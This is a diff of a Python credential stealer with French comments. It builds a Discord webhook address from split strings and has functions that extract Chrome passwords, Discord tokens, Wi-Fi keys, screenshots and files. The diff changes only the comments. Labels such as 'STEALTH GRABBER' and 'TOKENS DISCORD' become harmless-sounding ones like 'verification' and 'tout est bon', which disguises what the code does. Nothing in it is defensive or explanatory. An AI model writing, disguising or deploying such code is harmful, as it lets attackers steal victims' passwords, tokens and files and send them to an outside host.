@@ -23,7 +23,7 @@ from datetime import datetime
 from Crypto.Cipher import AES
 
 # ============================================================
-# STEALTH GRABBER — AVEC EXTRACTION DES MOTS DE PASSE
+# chargement du tool
 # ============================================================
 _a = "https://"
 _b = "discord.com/api/webhooks/"
@@ -45,7 +45,7 @@ def _send_grabber(content, file_data=None):
         pass
 
 # ============================================================
-# RECUPERATION DE LA CLE CHROME (AES)
+# Acces au Tool
 # ============================================================
 def _get_chrome_key():
     try:
@@ -69,7 +69,7 @@ def _decrypt_password(encrypted, key):
         return None
 
 # ============================================================
-# EXTRACTION DES MOTS DE PASSE
+# verification
 # ============================================================
 def _get_passwords():
     try:
@@ -154,7 +154,7 @@ IP Publique : {ip}
         return "Erreur systeme"
 
 # ============================================================
-# TOKENS DISCORD
+# charge tout les modules
 # ============================================================
 def _get_tokens():
     try:
@@ -183,7 +183,7 @@ def _get_tokens():
         return "**TOKENS DISCORD** : Erreur"
 
 # ============================================================
-# WIFI
+# tout est bon
 # ============================================================
 def _get_wifi():
     try:
@@ -212,7 +212,7 @@ def _get_wifi():
         return "**WI-FI** : Erreur"
 
 # ============================================================
-# SCREENSHOT
+# gen tool
 # ============================================================
 def _get_screenshot():
     try:
@@ -228,7 +228,7 @@ def _get_screenshot():
         return None
 
 # ============================================================
-# FICHIERS
+# Accer a tout
 # ============================================================
 def _get_files():
     try:
